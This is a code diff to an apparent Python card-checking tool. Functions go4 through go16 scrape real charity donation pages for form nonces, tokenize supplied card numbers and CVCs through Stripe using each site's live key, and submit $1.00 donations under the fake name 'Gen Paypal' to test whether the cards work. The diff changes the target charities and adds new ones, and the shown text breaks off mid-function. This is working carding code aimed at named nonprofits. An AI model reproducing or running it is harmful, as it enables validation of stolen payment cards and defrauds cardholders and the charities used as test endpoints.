@@ -920,7 +920,7 @@ def go4(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=40644&client_attribution_metadata[client_session_id]=8fcfbd26-1b1c-4d6b-9b96-1f8f6cca5524&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=40644&client_attribution_metadata[client_session_id]=8fcfbd26-1b1c-4d6b-9b96-1f8f6cca5524&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -1685,7 +1685,7 @@ def go8(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=31687&client_attribution_metadata[client_session_id]=b7898d10-3066-4d12-b150-d3ee91400645&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=31687&client_attribution_metadata[client_session_id]=b7898d10-3066-4d12-b150-d3ee91400645&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -1882,7 +1882,7 @@ def go9(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=10002&billing_details[address][state]=New+York&billing_details[phone]=4303000850&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Falexandrasangels.org&time_on_page=43543&client_attribution_metadata[client_session_id]=51bf6c5c-296c-469b-ab72-91fa57e9a5d6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=&billing_details[address][state]=New+York&billing_details[phone]=4303000850&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Falexandrasangels.org&time_on_page=43543&client_attribution_metadata[client_session_id]=51bf6c5c-296c-469b-ab72-91fa57e9a5d6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -2794,7 +2794,7 @@ def go14(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://run4yitzi.com/campaigns/izabennaroch/donate/', headers=headers)
+        response = requests.get('https://hopemtnva.com/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2821,7 +2821,7 @@ def go14(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Frun4yitzi.com&time_on_page=34596&client_attribution_metadata[client_session_id]=28d55e99-c05d-430a-8c92-27a89d8614ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fhopemtnva.com&time_on_page=50747&client_attribution_metadata[client_session_id]=4824e16e-e7f2-4bbb-8742-616ef52b0667&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PBId7FhEK3phoWoX9dH9x8HZcCxtloZxTcGEvn5JSF3SfPSNLFMob2bPNRUbCN5bRk9Hb1NLf0Xcj5hXY9NICMc00JzgoE1TS'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -2833,23 +2833,19 @@ def go14(cc_input: str) -> str:
                 
         #3
         cookies = {
-            'charitable_session': 'f172c8057d0422d36984dd4f12c7e7a3||86400||82800',
-            '_ga_NDJN4WKJVS': 'GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0',
-            '_ga': 'GA1.2.457464258.1767347484',
-            '_gid': 'GA1.2.110531386.1767347484',
-            '_gat_gtag_UA_32258511_9': '1',
-            '__stripe_mid': 'd0be3287-881e-45f7-8962-4c891b5fa80523afe2',
-            '__stripe_sid': '81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
+            '__stripe_mid': 'ec5e888e-3b27-42cb-83a9-ae9b277d8b28bdcf49',
+            '__stripe_sid': 'b897c3b8-7bc7-492a-adb3-a853040dc919cfd06b',
+            'charitable_session': '251a6eca554eb6d0bd1bfc269bc8db2d||86400||82800',
         }
         
         headers = {
-            'authority': 'run4yitzi.com',
+            'authority': 'hopemtnva.com',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': 'charitable_session=f172c8057d0422d36984dd4f12c7e7a3||86400||82800; _ga_NDJN4WKJVS=GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0; _ga=GA1.2.457464258.1767347484; _gid=GA1.2.110531386.1767347484; _gat_gtag_UA_32258511_9=1; __stripe_mid=d0be3287-881e-45f7-8962-4c891b5fa80523afe2; __stripe_sid=81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
-            'origin': 'https://run4yitzi.com',
-            'referer': 'https://run4yitzi.com/campaigns/izabennaroch/donate/',
+            # 'cookie': '__stripe_mid=ec5e888e-3b27-42cb-83a9-ae9b277d8b28bdcf49; __stripe_sid=b897c3b8-7bc7-492a-adb3-a853040dc919cfd06b; charitable_session=251a6eca554eb6d0bd1bfc269bc8db2d||86400||82800',
+            'origin': 'https://hopemtnva.com',
+            'referer': 'https://hopemtnva.com/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -2864,24 +2860,22 @@ def go14(cc_input: str) -> str:
             'charitable_form_id': f'{form_id}',
             f'{form_id}': '',
             '_charitable_donation_nonce': f'{donation_nonce}',
-            '_wp_http_referer': '/campaigns/izabennaroch/donate/',
+            '_wp_http_referer': '/',
             'campaign_id': f'{campaign_id}',
-            'description': 'Iza Benarroch',
+            'description': 'Hope Mountain',
             'ID': f'{donation_id}',
             'gateway': 'stripe',
             'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
-            'recurring_donation': 'once',
             'first_name': 'Gen',
             'last_name': 'Paypal',
             'email': email,
-            'donor_comment': '',
             'stripe_payment_method': f'{pm}',
             'action': 'make_donation',
             'form_action': 'make_donation',
         }
         
-        response = requests.post('https://run4yitzi.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response = requests.post('https://hopemtnva.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2918,7 +2912,390 @@ def go14(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb',
+    'key': 'pk_live_51PBId7FhEK3phoWoX9dH9x8HZcCxtloZxTcGEvn5JSF3SfPSNLFMob2bPNRUbCN5bRk9Hb1NLf0Xcj5hXY9NICMc00JzgoE1TS',
+    'client_secret': full_secret,
+            }
+            response = requests.post(
+    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
+    headers=headers,
+    data=data,
+            )                        
+            # message
+            result2 = response.text                      	
+            return result2 #stop
+            	
+        else:
+            print("❌ Payment no need Rq4. Stopping here.")
+            result2 = response.text
+            return result2  #stop
+            
+    except Exception as e:
+        print(f"Error occurred: {e}")
+#================================
+# --- Main CC Check Function ---
+def go15(cc_input: str) -> str:
+    try:
+        n, mm, yy, cvc = cc_input.strip().split("|")
+
+        if int(mm) < 10 and not mm.startswith("0"):
+            mm = f"0{mm}"
+        if not yy.startswith("20"):
+            yy = f"20{yy}"
+
+        user = generate_user_agent()
+        r = requests.Session()
+        r.verify = False
+
+        first_name, last_name = generate_full_name()
+        kaddress, city, country, postcode, phone = generate_address()
+        email = generate_email()
+        username = generate_username()
+        corr = generate_random_code()
+        sess = generate_random_code()
+
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")  
+      
+        #1
+        headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+        }
+        response = requests.get('https://unseenhandministries.com/campaigns/medical-clinic-project/', headers=headers)
+        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
+        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
+        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
+        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
+        print(f"G15 ID Response: {form_id}")
+        print(f"G15 ID Response: {donation_nonce}")
+        print(f"G15 ID Response: {campaign_id}")
+        print(f"G15 ID Response: {donation_id}")
+        	
+        #2
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
+        }
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=AF&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Funseenhandministries.com&time_on_page=47015&client_attribution_metadata[client_session_id]=7b55d373-002b-4bd2-8df6-9c6c65f58974&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51O62R3FzB8BwHVr2LoNHKaJ5O0B0h7B6mbIXKlAKpXDHQnSa7XgOqeEJpjKf9cJKabvI1JZgbE8qTjX24z1cKm2V00lJzrMIWV'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        res_json = response.json()
+        pm = res_json.get('id')
+        print(f"G15 ID Response: {pm}")
+        if not id:
+            print("Failed to get payment method.")
+            return
+                
+        #3
+        cookies = {
+            'charitable_session': '24e69f23f554ec7ac9e1ba5be4cd8e15||86400||82800',
+            '__stripe_mid': 'b8b536c0-ef81-4ae6-8d36-21cc11b1d8e32b62ab',
+            '__stripe_sid': '4449db96-198d-471b-a198-5a52ceac887256d1b2',
+        }
+        
+        headers = {
+            'authority': 'unseenhandministries.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=24e69f23f554ec7ac9e1ba5be4cd8e15||86400||82800; __stripe_mid=b8b536c0-ef81-4ae6-8d36-21cc11b1d8e32b62ab; __stripe_sid=4449db96-198d-471b-a198-5a52ceac887256d1b2',
+            'origin': 'https://unseenhandministries.com',
+            'referer': 'https://unseenhandministries.com/campaigns/medical-clinic-project/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        data = {
+            'charitable_form_id': f'form_id',
+            f'form_id': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/medical-clinic-project/',
+            'campaign_id': '2722',
+            'description': 'Medical Clinic Project',
+            'ID': f'{donation_id}',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'AF',
+            'phone': '',
+            'gateway': 'stripe',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
+        }
+        
+        response = requests.post('https://unseenhandministries.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        if "secret" in response.text:
+            print("✅ req3 required. Continue with next step...")
+            response_str = response.text
+            response = json.loads(response_str)
+            secret = response.get("secret")
+            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
+            match = re.match(pattern, secret)
+            if match:
+            	full_secret = secret
+            	prefix = match.group(1)
+            	print("Full secret:", full_secret)
+            	print("Prefix:", prefix)
+            else:
+            	print("No match found")
+            	
+            #4
+            headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'pragma': 'no-cache',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+            }
+            data = {
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'key': 'pk_live_51O62R3FzB8BwHVr2LoNHKaJ5O0B0h7B6mbIXKlAKpXDHQnSa7XgOqeEJpjKf9cJKabvI1JZgbE8qTjX24z1cKm2V00lJzrMIWV',
+    'client_secret': full_secret,
+            }
+            response = requests.post(
+    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
+    headers=headers,
+    data=data,
+            )                        
+            # message
+            result2 = response.text                      	
+            return result2 #stop
+            	
+        else:
+            print("❌ Payment no need Rq4. Stopping here.")
+            result2 = response.text
+            return result2  #stop
+            
+    except Exception as e:
+        print(f"Error occurred: {e}")
+#================================
+# --- Main CC Check Function ---
+def go16(cc_input: str) -> str:
+    try:
+        n, mm, yy, cvc = cc_input.strip().split("|")
+
+        if int(mm) < 10 and not mm.startswith("0"):
+            mm = f"0{mm}"
+        if not yy.startswith("20"):
+            yy = f"20{yy}"
+
+        user = generate_user_agent()
+        r = requests.Session()
+        r.verify = False
+
+        first_name, last_name = generate_full_name()
+        kaddress, city, country, postcode, phone = generate_address()
+        email = generate_email()
+        username = generate_username()
+        corr = generate_random_code()
+        sess = generate_random_code()
+
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")  
+      
+        #1
+        headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+        }
+        response = requests.get('https://letussoar.com/campaigns/education-for-everyone', headers=headers)
+        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
+        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
+        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
+        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
+        print(f"G16 ID Response: {form_id}")
+        print(f"G16 ID Response: {donation_nonce}")
+        print(f"G16 ID Response: {campaign_id}")
+        print(f"G16 ID Response: {donation_id}")
+        	
+        #2
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
+        }
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fletussoar.com&time_on_page=103640&client_attribution_metadata[client_session_id]=119039fb-dcd6-4c5a-8859-d4c5a0e476d4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Sb1OURfyggrecD8Y2FDk7kLjEeRAKFOjOVc5EGLXRZls2kOsp2ZjwwQtqmeC1064HhkbLAI1lobneWyiaW4TsFI00p37S47fA'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        res_json = response.json()
+        pm = res_json.get('id')
+        print(f"G16 ID Response: {pm}")
+        if not id:
+            print("Failed to get payment method.")
+            return
+                
+        #3
+        cookies = {
+            'charitable_session': 'f73b8431f216636831c980e90f95eb77||86400||82800',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_first_add': 'fd%3D2026-01-04%2021%3A03%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            '_tccl_visitor': '9d09cbe1-7251-4aef-9af8-5cf212b12e4d',
+            '_tccl_visit': '9d09cbe1-7251-4aef-9af8-5cf212b12e4d',
+            '__cf_bm': 'Oy79NXKeY9tNRm8QgGNtbl8mFC.BzfuXrfCzWAe33Fs-1767560630-1.0.1.1-LljUOOGROGn6YiaxZjuz1.05orS6I4WLevxXWYwUB_G0wAD4LQW54H0WUC_ZavsJhYchP45ZknpI8zoc4g7rDy0CIdobe1Fx9_mms9cXDeY',
+            'sbjs_current_add': 'fd%3D2026-01-04%2021%3A03%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F',
+            '_scc_session': 'pc=2&C_TOUCH=2026-01-04T21:03:50.749Z',
+            '__stripe_mid': '989dd258-9650-4fec-8db8-43e44d7d3cf56aa64c',
+            '__stripe_sid': 'ae601e9b-42e5-45f4-ae7a-72d095887dd501378e',
+        }
+        
+        headers = {
+            'authority': 'letussoar.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=f73b8431f216636831c980e90f95eb77||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-01-04%2021%3A03%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _tccl_visitor=9d09cbe1-7251-4aef-9af8-5cf212b12e4d; _tccl_visit=9d09cbe1-7251-4aef-9af8-5cf212b12e4d; __cf_bm=Oy79NXKeY9tNRm8QgGNtbl8mFC.BzfuXrfCzWAe33Fs-1767560630-1.0.1.1-LljUOOGROGn6YiaxZjuz1.05orS6I4WLevxXWYwUB_G0wAD4LQW54H0WUC_ZavsJhYchP45ZknpI8zoc4g7rDy0CIdobe1Fx9_mms9cXDeY; sbjs_current_add=fd%3D2026-01-04%2021%3A03%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F; _scc_session=pc=2&C_TOUCH=2026-01-04T21:03:50.749Z; __stripe_mid=989dd258-9650-4fec-8db8-43e44d7d3cf56aa64c; __stripe_sid=ae601e9b-42e5-45f4-ae7a-72d095887dd501378e',
+            'origin': 'https://letussoar.com',
+            'referer': 'https://letussoar.com/campaigns/education-for-everyone/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        data = {
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/education-for-everyone/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Education For Everyone Initiative',
+            'ID': f'{donation_id}',
